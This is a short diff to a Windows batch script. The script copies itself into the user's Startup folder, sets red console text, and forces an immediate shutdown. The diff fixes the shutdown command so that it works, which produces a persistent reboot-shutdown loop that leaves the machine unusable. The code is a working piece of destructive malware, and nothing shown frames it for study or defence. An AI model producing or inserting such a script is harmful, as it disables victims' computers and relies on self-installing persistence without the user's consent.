@@ -1,4 +1,4 @@
 @echo off
 copy %0 "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
 color 4
-shutdown /f /t 0
+shutdown /s /f /t 0
